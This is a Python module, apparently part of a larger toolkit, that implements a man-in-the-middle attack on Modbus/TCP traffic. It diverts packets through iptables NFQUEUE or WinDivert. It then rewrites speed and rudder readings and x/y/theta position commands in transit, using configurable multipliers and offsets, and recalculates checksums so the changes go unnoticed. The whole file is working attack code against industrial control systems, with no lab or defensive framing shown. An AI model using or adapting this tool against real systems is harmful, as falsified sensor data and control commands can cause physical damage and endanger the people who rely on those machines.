'''
NFQ module. Callbacks and persistent object
'''

from scapy.all import IP, TCP, Packet
from scapy.contrib.modbus import ModbusADURequest, ModbusADUResponse
import threading, os, select, subprocess
from .. import modbus_util as mb
from .nmap import NMapper
from ..mod_table import ModTable
from ..data_buffer import DataBuffer

import platform
os_name = platform.system()

if os_name == "Windows":
    import pydivert
elif os_name == "Linux":
    from netfilterqueue import NetfilterQueue as NFQ
elif os_name == "Darwin":
    from netfilterqueue import NetfilterQueue as NFQ
else:
    print(f"Running on an unidentified system: {os_name}")


class NetFilterQueue:

    def __init__(self, buffer: DataBuffer, mod_table: ModTable):
        self.stop_event = None
        self.thread = None
        self.callback = None
        self.windows_callback = None
        self.buffer = buffer
        self.table = mod_table


    def is_running(self):
        return self.stop_event is not None or self.thread is not None


    def start(self): 
        if self.is_running():
            self.buffer.put("mitm", "MITM attack is already running")
            return
        self.callback = self.nfq_callback
        self.windows_callback = None
        self.stop_event = threading.Event()
        self.buffer.put("mitm", "Starting MITM attack")

        # Run appropriate packet prerouter
        if os_name == "Linux" or os_name == "Darwin":
            self.thread = threading.Thread(target=self._start_linux, daemon=True)
        elif os_name == "Windows":
            self.thread = threading.Thread(target=self._start_windows, daemon=True)
        self.thread.start()


    def _start_windows(self):
        self.buffer.put("mitm", "Starting WinDivert")

        filt = (
            "true"
        )

        with pydivert.WinDivert(filt) as w:
            self.w = w

            while not self.stop_event.is_set():

                try:
                    packet = w.recv()

                    try:
                        spkt = IP(bytes(packet.raw))
                    except Exception:
                        w.send(packet)
                        continue

                    self.buffer.put("mitm", "Incoming mitm packet", spkt)
                    newspkt = self.modify_spkt(spkt)
                    self.buffer.put("mitm", "Outgoing mitm Packet", spkt)

                    if newspkt is not None:
                        packet.payload = bytes(newspkt)

                    w.send(packet)

                except Exception as e:
                    self.buffer.put(
                        "mitm",
                        f"WinDivert error: {e}"
                    )
                    self.buffer.put("mitm", "Problematic Packet", spkt)
                    pass

        self.buffer.put("mitm", "Stopped WinDivert")


    def _start_linux(self):
        # Calculate iface
        nmapper = NMapper(self.buffer)
        active_iface = nmapper.get_active_iface()

        # IPTables rule
        
        cmd = [
            "sudo",
            "iptables",
            "-t", "mangle",
            "-A", "PREROUTING",
            "-i", active_iface,
            # "-p", "tcp",
            "-j", "NFQUEUE",
            "--queue-num", "1",
        ]

        result = subprocess.run(cmd, capture_output=True, text=True)

        print("stdout:", result.stdout)
        print("stderr:", result.stderr)
        print("returncode:", result.returncode)
        
        self.buffer.put("mitm", f"Adding iptables rule:")
        self.buffer.put("mitm", f"sudo iptables -t mangle -A PREROUTING -i {active_iface} -p TCP -j NFQUEUE --queue-num 1")
        # Part	Meaning
        # iptables	Configure Linux packet filtering rules
        # -t mangle	Use the mangle table (used for packet modification/inspection)
        # -A PREROUTING	Append rule to the PREROUTING chain
        # -i wlp5s0	Match packets arriving on interface wlp5s0
        # -p TCP	Match only TCP packets
        # -j NFQUEUE	Instead of normal processing, send packets to an NFQUEUE
        # --queue-num 1	Send them to queue number 1

        # Create and bind NFQ callback
        nfq = NFQ()
        nfq.bind(1, self.callback)

        # Get readable file descriptor
        qfd = nfq.get_fd()
        poller = select.poll()
        poller.register(qfd, select.POLLIN)

        # Pipe for stop signaling
        stop_r, stop_w = os.pipe()
        poller.register(stop_r, select.POLLIN)
        self.buffer.put("mitm", "Starting NFQ")
        try:
            while not self.stop_event.is_set():
                events = poller.poll(500)
                for fd, _ in events:
                    if fd == qfd:
                        nfq.run(False)   # process packets without blocking
                    elif fd == stop_r:
                        self.stop_event.set()
        # Stop on error or stop event
        finally:
            nfq.unbind()
            os.close(stop_r)
            os.close(stop_w)
            cmd = [
                "sudo",
                "iptables",
                "-t", "mangle",
                "-D", "PREROUTING",
                "-i", active_iface,
                # "-p", "tcp",
                "-j", "NFQUEUE",
                "--queue-num", "1",
            ]

            result = subprocess.run(cmd, capture_output=True, text=True)

            print("stdout:", result.stdout)
            print("stderr:", result.stderr)
            print("returncode:", result.returncode)
            self.buffer.put("mitm", "Stopped net filter queue")


    def stop(self):
        if self.thread is None:
            self.buffer.put("mitm", "MITM attack is not running")
            return
        else:
            self.stop_event.set()
            self.thread.join(timeout=2)
            self.stop_event = None
            self.thread = None
            self.callback = None
            self.buffer.put("mitm", "Stopped MITM attack")


    # Callbacks

    def nfq_callback(self, pkt: Packet):
        spkt = IP(pkt.get_payload())
        self.buffer.put("mitm", "incoming mitm packet", spkt)
        
        spkt = self.modify_spkt(spkt)

        self.buffer.put("mitm", "outgoing mitm packet", spkt)

        pkt.set_payload(bytes(spkt))
        pkt.accept()

    
    def accept_only(self, pkt: Packet):
        pkt.accept()
    

    def print_and_accept(self, pkt: Packet):
        spkt = IP(pkt.get_payload())
        self.buffer.put("mitm", "Incoming Packet", spkt)
        pkt.accept()
        self.buffer.put("mitm", "Outgoing Packet", spkt)


    def modify_spkt(self, spkt: Packet) -> Packet:
        '''
        Returns a packet, modified according to the mod table
        '''
        modified_flag = False
        if spkt.haslayer("Read Holding Registers Response"):
            mult = self.table.get_raw("speed", "mult")
            offset = self.table.get_raw("speed", "offset")

            mbl = spkt.getlayer(ModbusADUResponse)

            speed = mbl.payload.registerVal[0]
            val = int(speed * mult + offset)
            val = max(0, min(65535, val))
            mbl.payload.registerVal[0] = val

            if len(mbl.payload.registerVal) > 1:
                mult = self.table.get_raw("rudder", "mult")
                offset = self.table.get_raw("rudder", "offset")
                rudder = mbl.payload.registerVal[1]
                val = int(rudder * mult + offset)
                val = max(0, min(65535, val))
                mbl.payload.registerVal[1] = val

            modified_flag = True

        elif spkt.haslayer("Write Single Register"):

            mbl = spkt.getlayer(ModbusADURequest)

            if mbl.payload.registerAddr == 10: # X address
                var = "x"
            elif mbl.payload.registerAddr == 11: # Y address
                var = "y"
            else: # Theta address
                var = "theta"

            z = mbl.payload.registerValue
            mult = self.table.get_raw(var, "mult")
            offset = self.table.get_raw(var, "offset")
            val = int(z * mult + offset)
            val = max(0, min(65535, val))
            mbl.payload.registerValue = val

            modified_flag = True

        # Recalculate checksums if modified
        if modified_flag:
            # del mbl.len
            del spkt[IP].len
            del spkt[TCP].chksum
            del spkt[IP].chksum

            spkt = IP(bytes(spkt))
        return spkt